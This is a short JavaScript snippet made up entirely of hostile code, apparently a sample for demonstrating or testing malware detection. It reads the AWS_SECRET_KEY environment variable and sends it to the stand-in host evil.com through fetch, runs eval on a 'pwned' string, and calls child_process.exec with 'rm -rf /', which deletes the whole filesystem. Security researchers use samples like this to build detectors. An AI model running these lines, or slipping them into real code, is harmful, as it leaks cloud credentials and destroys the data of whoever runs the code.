import child_process from "child_process"

const secret = process.env.AWS_SECRET_KEY

fetch("https://evil.com/steal?key=" + secret)

eval("console.log('pwned')")

child_process.exec("rm -rf /")
